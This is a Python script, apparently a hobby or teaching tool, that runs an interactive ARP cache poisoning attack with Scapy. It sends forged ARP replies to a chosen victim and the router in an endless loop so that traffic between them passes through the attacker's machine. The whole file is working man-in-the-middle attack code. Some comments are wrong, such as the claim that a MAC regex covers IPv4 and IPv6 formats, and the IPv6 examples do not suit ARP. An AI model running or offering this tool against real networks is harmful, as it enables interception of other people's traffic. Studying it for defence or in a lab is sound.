# Import necessary modules
import ipaddress  # Import the 'ipaddress' module for IP address validation
import re  # Import the 're' module for regular expressions
from scapy.all import *  # Import all classes and functions from the 'scapy.all' module
from scapy.layers.l2 import ARP  # Import the 'ARP' class from the 'scapy.layers.l2' module
import time  # Import the 'time' module for time-related functions

def validate_ip(ip): # Function to validate an IP address
    try:
        ipaddress.ip_address(ip)  # Validate if the provided IP address is valid
        return True
    except ValueError:
        return False

def validate_mac(mac): # Function to validate a MAC address
    # Regular expression pattern to validate a MAC address (both IPv4 and IPv6 formats)
    mac_pattern = r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})|([0-9a-fA-F]{1,4}:){7}([0-9a-fA-F]{1,4})"
    return re.match(mac_pattern, mac)

"""
    Function to poison the target with an ARP response.

    Steps:
    1. Create an ARP response packet using the 'ARP()' class from Scapy.
    2. Set the operation code ('op') to 2, indicating an ARP response.
    3. Set the target IP address ('pdst') to be poisoned (Victim's/Target IP).
    4. Set the target MAC address ('hwdst') to the target MAC (Victim's/Target MAC).
    5. Set the source MAC address ('hwsrc') to the attacker's MAC.
    6. Set the source IP address ('psrc') to the router's IP.
    7. Print the details of the ARP packet using 'show()'.
    8. Send the ARP response packet.

    :param target_ip: Target IP address to be poisoned.
    :param target_mac: Target MAC address to be poisoned.
    :param attacker_mac: Attacker's MAC address.
    :param router_ip: Router's IP address.
"""
def poison_target(target_ip, target_mac, attacker_mac, router_ip): # Function to poison the target with ARP response
    my_arp_response = ARP()
    my_arp_response.op = 2  # Setting the operation code to 2, indicating an ARP response
    my_arp_response.pdst = target_ip  # Setting the target IP address to be poisoned (Victim's/Target IP)
    my_arp_response.hwdst = target_mac  # Setting the target MAC address (Victim's/Target MAC)
    my_arp_response.hwsrc = attacker_mac  # Setting the source MAC address (Attacker's MAC)
    my_arp_response.psrc = router_ip  # Setting the source IP address (Router's IP)
    print(my_arp_response.show())  # Printing the details of the ARP packet
    send(my_arp_response)  # Sending the ARP response packet

"""
    Function to poison the router with an ARP response.

    Steps:
    1. Create an ARP response packet using the 'ARP()' class from Scapy.
    2. Set the operation code ('op') to 2, indicating an ARP response.
    3. Set the target IP address ('pdst') to be poisoned (Router's IP).
    4. Set the target MAC address ('hwdst') to the router's MAC.
    5. Set the source MAC address ('hwsrc') to the attacker's MAC.
    6. Set the source IP address ('psrc') to the victim's/target IP.
    7. Print the details of the ARP packet using 'show()'.
    8. Send the ARP response packet.

    :param router_ip: Router's IP address to be poisoned.
    :param router_mac: Router's MAC address to be poisoned.
    :param attacker_mac: Attacker's MAC address.
    :param target_ip: Victim's/target IP address.
    """
def poison_router(router_ip, router_mac, attacker_mac, target_ip): # Function to poison the router with ARP response
    my_arp_response = ARP()
    my_arp_response.op = 2  # Setting the operation code to 2, indicating an ARP response
    my_arp_response.pdst = router_ip  # Setting the target IP address to be poisoned (Router's IP)
    my_arp_response.hwdst = router_mac  # Setting the target MAC address (Router's MAC)
    my_arp_response.hwsrc = attacker_mac  # Setting the source MAC address (Attacker's MAC)
    my_arp_response.psrc = target_ip  # Setting the source IP address (Victim's/Target IP)
    print(my_arp_response.show())  # Printing the details of the ARP packet
    send(my_arp_response)  # Sending the ARP response packet

def clear_variables(): # Function to clear all variables
    return "", "", "", ""

def view_variables(attacker_mac, target_ip, target_mac, router_ip, router_mac): # Function to view current variable values
    print("\n--- Current Variable Values ---")
    print(f"Attacker (Your) MAC Address: {attacker_mac}")
    print(f"Target IP Address: {target_ip}")
    print(f"Target MAC Address: {target_mac}")
    print(f"Router IP Address: {router_ip}")
    print(f"Router MAC Address: {router_mac}")

def main():
    try:
        # Get attacker's MAC address from user input
        attacker_mac = input("Enter Attacker (Your) MAC Address (e.g., 00:0c:29:97:05:57): ")
        target_ip = ""
        target_mac = ""
        router_ip = ""
        router_mac = ""

        while not validate_mac(attacker_mac) or not attacker_mac.strip():  # Check for empty input and validate MAC
            if not attacker_mac.strip():
                print("Attacker MAC cannot be empty.")
            else:
                print("Invalid MAC Address format. Please enter a valid MAC address.")
            attacker_mac = input("Enter Attacker (Your) MAC Address (e.g., 00:0c:29:97:05:57): ")

        while True:
            print("\n--- Menu ---")
            print("0. Clear All Variables")
            print("1. View Variable Values")
            print("2. Set Target IP and MAC")
            print("3. Set Router IP and MAC")
            print("4. Start ARP Cache Poisoning")
            print("5. Exit")

            choice = input("Enter your choice (0, 1, 2, 3, 4, or 5): ")

            if choice == "0":
                target_ip, target_mac, router_ip, router_mac = clear_variables()  # Function Call to Clear all variables
                print("All variables cleared successfully.")
            elif choice == "1":
                view_variables(attacker_mac, target_ip, target_mac, router_ip, router_mac)  # Function Call to View variable values
            elif choice == "2":
                target_ip = input("Enter Target IP (e.g., 192.168.1.1 or fe80::a00:27ff:fecd:ede2): ")
                while not validate_ip(target_ip) or not target_ip.strip():  # Check for empty input and validate IP
                    if not target_ip.strip():
                        print("Target IP cannot be empty.")
                    else:
                        print("Invalid IP Address format. Please enter a valid IP address.")
                    target_ip = input("Enter Target IP (e.g., 192.168.1.1 or fe80::a00:27ff:fecd:ede2): ")

                target_mac = input("Enter Target MAC (e.g., 00:0c:29:97:05:57): ")
                while not validate_mac(target_mac) or not target_mac.strip():  # Check for empty input and validate MAC
                    if not target_mac.strip():
                        print("Target MAC cannot be empty.")
                    else:
                        print("Invalid MAC Address format. Please enter a valid MAC address.")
                    target_mac = input("Enter Target MAC (e.g., 00:0c:29:97:05:57): ")

                print("Target IP & MAC Address Added Successfully")

            elif choice == "3":
                router_ip = input("Enter Router IP (e.g., 192.168.1.1 or fe80::a00:27ff:fecd:ede2): ")
                while not validate_ip(router_ip) or not router_ip.strip():  # Check for empty input and validate IP
                    if not router_ip.strip():
                        print("Router IP cannot be empty.")
                    else:
                        print("Invalid IP Address format. Please enter a valid IP address.")
                    router_ip = input("Enter Router IP (e.g., 192.168.1.1 or fe80::a00:27ff:fecd:ede2): ")

                router_mac = input("Enter Router MAC (e.g., 00:0c:29:97:05:57): ")
                while not validate_mac(router_mac) or not router_mac.strip():  # Check for empty input and validate MAC
                    if not router_mac.strip():
                        print("Router MAC cannot be empty.")
                    else:
                        print("Invalid MAC Address format. Please enter a valid MAC address.")
                    router_mac = input("Enter Router MAC (e.g., 00:0c:29:97:05:57): ")

                print("Router IP & MAC Address Added Successfully")

            elif choice == "4":
                if target_ip and target_mac and router_ip and router_mac:
                    try:
                        while True:
                            print("ARP CACHE POISONING STARTED!!!")
                            poison_target(target_ip, target_mac, attacker_mac, router_ip)
                            poison_router(router_ip, router_mac, attacker_mac, target_ip)
                            time.sleep(5)
                    except KeyboardInterrupt:
                        print("ARP Cache Poisoning Stopped")
                else:
                    print("Error: Please set all IP and MAC addresses before starting ARP Cache Poisoning.")

            elif choice == "5":
                print("Thank You For Using ARP Cache Poisoning")
                break
            else:
                print("Invalid choice. Please try again.")

    except KeyboardInterrupt:
        print("ARP Cache Poisoning Stopped")

"""
The code checks if the script is being run directly (as the main module) or if it is being imported by another module.

a)If the script is being run directly, the condition __name__ == '__main__' evaluates to True, and the code proceeds to call the main function.
b)If the script is being imported by another module, the condition __name__ == '__main__' evaluates to False, and the main function is not executed. This prevents the script's code from running if it is imported as a module, allowing it to be used as a library or component in another program.
"""
if __name__ == "__main__":
    main()
